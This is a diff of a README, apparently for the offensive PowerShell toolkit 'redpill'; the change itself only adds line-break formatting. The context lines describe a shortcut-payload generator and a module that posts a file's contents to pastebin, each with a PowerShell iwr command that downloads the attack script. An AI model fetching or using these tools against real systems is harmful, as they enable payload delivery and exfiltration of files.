@@ -4,10 +4,14 @@
 |---|---|---|---|
 |Out-shortcut|Creates an shortcut file that accepts cmdline arguments to execute|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/Out-Shortcut.png)|
 
+<br />
+
 **download cmdLet:**
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/Out-shortcut.ps1" -OutFile "Out-shortcut.ps1"
 ```
+
+<br />
 
 **execute:**
 ```powershell
@@ -23,16 +27,22 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-Fi
 |---|---|---|---|
 |SendToPasteBin|Get filepath contents and paste it to pastebin.|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/SendToPasteBin.png)|
 
+<br />
+
 **download cmdLet:**
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/SendToPasteBin.ps1" -OutFile "SendToPasteBin.ps1"
 ```
+
+<br />
 
 **prerequisites:**
 ```
 -filepath 'string' only accepts .ps1 .bat .vbs file formats
 -payloadurl 'string' only accepts .ps1 .bat .vbs file formats
 ```
+
+<br />
 
 **execute:**
 ```powershell
